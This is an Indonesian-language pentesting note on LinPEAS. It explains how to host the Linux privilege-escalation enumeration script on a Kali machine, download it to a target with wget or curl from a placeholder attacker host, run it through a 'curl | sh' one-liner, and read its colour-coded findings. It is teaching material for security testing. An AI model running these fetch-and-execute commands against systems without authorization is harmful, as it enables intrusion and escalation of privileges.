# LinPEAS (Otomatis)

**LinPEAS** adalah script untuk melakukan **Linux Privilege Escalation
Enumeration** secara otomatis.

## Sumber

- GitHub: [PEASS-ng](https://github.com/peass-ng/PEASS-ng)
- Kali Linux: `/usr/share/peass/linpeas/linpeas.sh`
- Cari file: `locate linpeas`

```bash
# Mengecek lokasi LinPEAS
locate linpeas
```

## Transfer ke Target

### Jalankan Web Server di Kali

```bash
python3 -m http.server 8089

# Menjalankan HTTP server sederhana pada port 8089
# File linpeas.sh harus berada di direktori yang di-share
```

### Download dari Target

```bash
wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh

# <LHOST> → IP mesin Kali/pentester
# 8089    → Port HTTP server
# -O      → Menentukan lokasi file output
```

Alternatif menggunakan `curl`:

```bash
curl http://<LHOST>:8089/linpeas.sh -o /tmp/linpeas.sh

# Mengunduh LinPEAS ke /tmp/linpeas.sh
```

## Eksekusi

```bash
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Memberikan permission execute
# Kemudian menjalankan LinPEAS
```

Simpan hasil ke file:

```bash
/tmp/linpeas.sh | tee /tmp/out.txt

# Menampilkan hasil ke terminal
# Sekaligus menyimpan output ke /tmp/out.txt
```

Atau langsung:

```bash
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt
```

## One-Liner

```bash
curl http://<LHOST>:8089/linpeas.sh | sh

# Mengunduh LinPEAS dan langsung menjalankannya
# Tidak menyimpan script secara permanen di disk
```

## Membaca Hasil

```text
MERAH
  ↓
Temuan yang berpotensi penting
  ↓
KUNING
  ↓
Temuan yang perlu diperiksa
  ↓
Validasi Manual
  ↓
Konfirmasi Vulnerability
```

**Fokus pemeriksaan:**

```text
SUID / SGID
sudo permissions
Cron Jobs
Writable Files
Capabilities
Credentials
SSH Keys
Environment Variables
Kernel / OS Information
Running Services
Docker / Container
```

> **Catatan:** LinPEAS adalah tool **enumeration**, bukan bukti otomatis bahwa
> privilege escalation dapat dilakukan. Temuan berwarna merah/kuning harus
> tetap divalidasi secara manual.

## Alur

```text
Kali / Pentester
      ↓
HTTP Server :8089
      ↓
Target Download LinPEAS
      ↓
LinPEAS Enumeration
      ↓
Temuan Merah/Kuning
      ↓
Validasi Manual
      ↓
Potensi Privilege Escalation
```
